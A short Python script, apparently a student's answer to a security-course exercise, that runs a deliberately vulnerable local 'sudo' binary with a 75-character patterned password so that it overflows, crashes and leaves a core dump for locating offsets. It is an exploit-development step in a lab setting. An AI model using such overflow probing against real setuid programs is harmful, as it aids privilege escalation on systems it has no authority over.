import os
import sys


def crash_sudo(path_to_sudo: str):
    """
    Execute the sudo program so that it crashes and generates a core dump.

    The same rules and tips from q1.py still apply (you must use the
    `path_to_sudo` value, prefer `os.execl` over `os.system`).

    :param path_to_sudo: The path to the vulnerable sudo program.
    """
    password = ''
    letters = "ABCDEFGHIJKLMNO" #15 letters (a-o) = 75
    for letter in letters:
        password += letter*5
    cmd = "whoami"
    
    args = [path_to_sudo, password, cmd]
    os.execl(path_to_sudo, *args)

def main(argv):
    # WARNING: Avoid changing this function.
    if not len(argv) == 1:
        print('Usage: %s' % argv[0])
        sys.exit(1)

    crash_sudo(path_to_sudo='./sudo')


if __name__ == '__main__':
    main(sys.argv)
